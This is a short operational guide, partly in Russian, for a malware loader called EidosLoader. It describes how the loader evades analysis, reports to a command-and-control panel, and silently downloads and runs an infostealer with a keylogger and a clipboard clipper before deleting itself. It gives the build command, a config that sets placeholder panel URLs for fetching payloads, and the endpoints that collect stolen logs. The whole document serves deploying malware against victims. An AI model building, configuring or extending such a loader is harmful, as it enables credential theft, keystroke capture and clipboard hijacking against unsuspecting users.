# EidosLoader Integration Guide

**EidosLoader** — stage 1 загрузчик. Скачивает и запускает Mirage Stealer, Eidos Clipper и другие модули.

## Архитектура

```
Жертва
  └── EidosLoader.exe (~30 KB)
       ├── Anti-analysis → HWID → C2
       ├── HTTP GET /api/payload?hwid=XXX
       │   ├── Mirage.exe (stealer + keylogger inside)
       │   └── EidosClipper.exe (если enabled)
       ├── CreateProcess(Mirage.exe, CREATE_NO_WINDOW)
       ├── CreateProcess(Clipper.exe, CREATE_NO_WINDOW) 
       └── Self-delete
```

## Build

```bash
cd EidosLoader
zig build -Dtarget=x86_64-windows
```

## Config (eidos.toml)

```toml
[c2]
url = "https://your-panel.com"

[payloads]
mirage = { url = "https://your-panel.com/payloads/mirage.exe", run = "exe" }
clipper = { url = "https://your-panel.com/payloads/clipper.exe", run = "exe" }
```

## Integration with Mirage

Mirage может сам запустить EidosLoader как stage 1 при ENABLE_LOADER.

## Integration with Panel

Eidos Panel должен иметь эндпоинты:
- GET /api/payload?hwid=XXX — вернуть список payload'ов для HWID
- POST /api/log — принять лог от стилера/клиппера
